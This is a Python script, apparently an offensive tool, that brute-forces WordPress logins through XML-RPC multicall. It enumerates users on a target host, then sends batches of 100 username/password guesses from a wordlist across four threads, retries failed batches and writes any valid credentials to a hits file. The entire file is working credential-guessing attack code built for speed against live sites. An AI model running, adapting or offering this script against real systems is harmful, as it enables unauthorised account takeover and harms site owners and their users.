"""Threaded multicall attacker: several batches in flight, resumable by offset.

Same response parsing as xmlrpc_bf, but a work queue feeds N workers so wall
clock drops from ~40 min to a couple of minutes. Writes hits immediately.
"""
from __future__ import annotations

import json
import queue
import sys
import threading
import time
import urllib.error

sys.path.insert(0, ".")
import xmlrpc_bf as x  # noqa: E402
import scan  # noqa: E402

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

HOST = sys.argv[1]
WORDFILE = sys.argv[2]
START = int(sys.argv[3]) if len(sys.argv) > 3 else 0
WORKERS = 4
BATCH = 100

WORDS = [w.rstrip("\n") for w in open(WORDFILE, encoding="utf-8") if w.strip()][START:]
lock = threading.Lock()
found = threading.Event()


def run(q):
    while not found.is_set():
        try:
            chunk = q.get_nowait()
        except queue.Empty:
            return
        for attempt in (1, 2):
            try:
                st, xml = x.post(HOST, x.build(chunk))
                if st == 200:
                    break
            except urllib.error.HTTPError as e:
                st = e.code
            except Exception:
                st = 0
            time.sleep(1.5)
        else:
            print(f"  ! lost batch at offset {START}", flush=True)
            continue
        if st != 200:
            print(f"  ! status {st}", flush=True)
            continue
        good = x.verdicts(xml, len(chunk))
        if good is None:                     # unparsable body, not a verdict
            good = x.verdicts(xml, len(chunk))
        if good is None:
            print(f"  ! unparsable batch, retrying", flush=True)
            try:
                st, xml = x.post(HOST, x.build(chunk))
                good = x.verdicts(xml, len(chunk))
            except Exception:
                good = None
        if good is None:
            print(f"  ! dropped batch", flush=True)
            continue
        for (u, p), ok in zip(chunk, good):
            if ok:
                line = f"{HOST}\t{u}\t{p}"
                with lock:
                    print(f"  *** HIT {line}", flush=True)
                    with open("wp_hits.txt", "a", encoding="utf-8") as f:
                        f.write(line + "\n")
                found.set()


users = x.users_of(HOST)
if len(sys.argv) > 4:                      # explicit user override
    users = [u for u in sys.argv[4].split(",") if u]
if not users:
    sys.exit("no users")
pairs = [(u, p) for u in users for p in WORDS]
print(f"[{HOST}] users={users} remaining_words={len(WORDS)} "
      f"guesses={len(pairs)} batches={-(-len(pairs) // BATCH)} workers={WORKERS}", flush=True)

q = queue.Queue()
for i in range(0, len(pairs), BATCH):
    q.put(pairs[i:i + BATCH])

threads = [threading.Thread(target=run, args=(q,), daemon=True) for _ in range(WORKERS)]
t0 = time.time()
for t in threads:
    t.start()
for t in threads:
    t.join()
print(f"done in {round(time.time() - t0)}s, hits={open('wp_hits.txt').read().count(chr(10)) if __import__('os').path.exists('wp_hits.txt') else 0}", flush=True)
